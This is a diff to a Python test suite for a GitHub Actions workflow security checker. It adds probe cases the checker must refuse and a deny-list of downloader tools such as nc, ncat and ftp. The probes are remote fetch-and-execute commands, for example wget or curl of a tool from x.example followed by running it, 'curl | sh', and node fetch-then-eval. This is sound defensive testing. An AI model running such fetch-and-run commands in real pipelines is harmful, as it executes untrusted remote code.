@@ -746,8 +746,10 @@ class Round6(unittest.TestCase):
         head = "    strategy:\n      matrix:\n        include:\n          - os: ubuntu-latest\n            tgt: x\n"
         steps = ("      - id: ck\n        uses: actions/checkout@" + SHA40 + "\n"
                  + self.step("echo ok >> \"$GITHUB_OUTPUT\"", ident="r1", env={"V": "${{ secrets.S }}"})
-                 + self.step("echo ${{ secrets.S }} ${{ matrix.tgt }} ${{ steps.ck.outputs.ref }} ${{ steps.r1.outputs.v }}"))
+                 + self.step("echo ${{ secrets.S }} ${{ matrix.tgt }} ${{ steps.r1.outputs.v }}"))
         self.assertEqual(self.errs(self.doc(steps, head)), [])
+        # Round 8 (S3, vote 6def5ab6 option B): the output of a `uses:` step is not an allowed root in run text
+        self.assertCaught(self.doc(steps.replace("${{ steps.r1.outputs.v }}", "${{ steps.ck.outputs.ref }}"), head), "`uses:` step")
 
     def test_steps_output_of_an_unsafe_step_refused(self):
         tag = "      - id: x\n        uses: actions/checkout@v4\n"
@@ -835,9 +837,15 @@ class Round6(unittest.TestCase):
                 "ls -la dist\n")
         self.assertEqual(self.errs(self.doc(self.step(body))), [])
 
-    def test_a_step_without_a_fetch_may_run_anything(self):
-        body = "set -euo pipefail\n./scripts/build.sh\npython3 tool.py \"$X\"\ncat > f << 'EOF'\nx ${y}\nEOF\n"
+    def test_a_step_without_a_fetch_runs_only_the_listed_commands(self):
+        body = "set -euo pipefail\nbash scripts/build.sh\npython3 tool.py \"$X\"\ncat > f << 'EOF'\nx ${y}\nEOF\n"
         self.assertEqual(self.errs(self.doc(self.step(body))), [])
+        self.assertCaught(self.doc(self.step("./scripts/build.sh\n")), "RUN_ALLOWED")  # Round 8, S8: not a listed word
+
+    def test_the_run_allow_list_is_sorted_and_names_no_downloader(self):
+        self.assertEqual(G.RUN_ALLOWED, tuple(sorted(G.RUN_ALLOWED)))
+        for word in ("pip", "pip3", "npm", "go", "aria2c", "nc", "ncat", "ftp", "lynx", "perl", "ruby", "node", "sh"):
+            self.assertNotIn(word, G.RUN_ALLOWED)
 
     # ---- security 3 and 4: runner labels
     def test_matrix_os_must_be_a_hosted_label(self):
@@ -1147,6 +1155,23 @@ PROBES = {
     "S14 run expression that expands to text": (probe_runs("      - run: ${{ format('curl {0} | sh', 'x') }}\n"), None, 1),
     "S15 job-level remote reusable workflow unpinned": ("jobs:\n  a:\n    uses: o/r/.github/workflows/w.yml@main\n", None, 1),
     "CONTROL plain run": (probe_runs(probe_step("echo ok")), None, 0),
+    # ---- code r7 (comment 6394815623) X probes, rebuilt from the review text: C2 = X15/X16, C3 = X1/X2, C4 = X3-X6,
+    # C5 = X12, C6 = X7-X10; X13/X14 are check-5 downloaders the S8 allow-list refuses by construction
+    "X1 python -Ic urllib (combined flag)": (probe_run1("python3 -Ic 'import urllib.request as u; u.urlretrieve(\"https://x.example/f\",\"f\")'", "sh f"), None, 1),
+    "X2 python -murllib.request (attached module)": (probe_run1("python3 -murllib.request https://x.example/f", "sh f"), None, 1),
+    "X3 docker container run by tag": (probe_run1("docker container run --rm alpine:3 sh -c id"), None, 1),
+    "X4 docker image pull by tag": (probe_run1("docker image pull alpine:3"), None, 1),
+    "X5 docker global option before the subcommand": (probe_run1("docker --context default run --rm alpine:3 id"), None, 1),
+    "X6 docker run unlisted valued option hides the tag": (probe_run1("docker run --log-opt alpine@" + PROBE_DIG + " alpine:3 id"), None, 1),
+    "X7 wget remote-named file run by the next step": (probe_runs("      - run: wget -q https://x.example/tool\n", "      - run: chmod +x tool && ./tool\n"), None, 1),
+    "X8 next step names the file by a variable": (probe_runs("      - run: curl -fsSL -o tool https://x.example/tool\n", "      - run: |\n          t=to\n          chmod +x ${t}ol && ./${t}ol\n"), None, 1),
+    "X9 next step names the file by a glob": (probe_runs("      - run: curl -fsSL -o tool https://x.example/tool\n", "      - run: chmod +x too? && ./too?\n"), None, 1),
+    "X10 next step the scanner cannot read": (probe_runs("      - run: curl -fsSL -o tool https://x.example/tool\n", "      - run: |\n          chmod +x tool && ./tool\n          echo )\n"), None, 1),
+    "X12 gh api download then a run": (probe_run1("gh api repos/o/r/tarball/v1 > f.tgz", "tar xzf f.tgz", "sh f/i.sh"), None, 1),
+    "X13 npx runs a fetched package": (probe_run1("npx -y some-pkg@1"), None, 1),
+    "X14 node -e fetch and eval": (probe_run1("node -e 'fetch(\"https://x.example/f\").then(r=>r.text()).then(eval)'"), None, 1),
+    "X15 verify inside an uncalled function counts": (probe_run1(PROBE_FETCH, "g() { " + PROBE_VERIFY + "; }", "tar xzf f"), None, 1),
+    "X16 verify inside a brace group then tar (control)": (probe_run1(PROBE_FETCH, "{ " + PROBE_VERIFY + "; }", "tar xzf f"), None, 0),
 }
 
 
@@ -1155,7 +1180,7 @@ class Round8(unittest.TestCase):
     `r5_errors` (1 = refused, 0 = accepted) and the table is the same 69 rows the reviewer ran."""
 
     def test_probe_table_has_the_reviewed_size(self):
-        self.assertEqual(len(PROBES), 69)
+        self.assertEqual(len(PROBES), 69 + 15)  # 69 of security r7 (S1-S9) plus 15 of code r7 (C1-C6 X probes)
 
     def test_every_probe_matches_its_wanted_result(self):
         tree = Path(scratch()) / "r8probe"
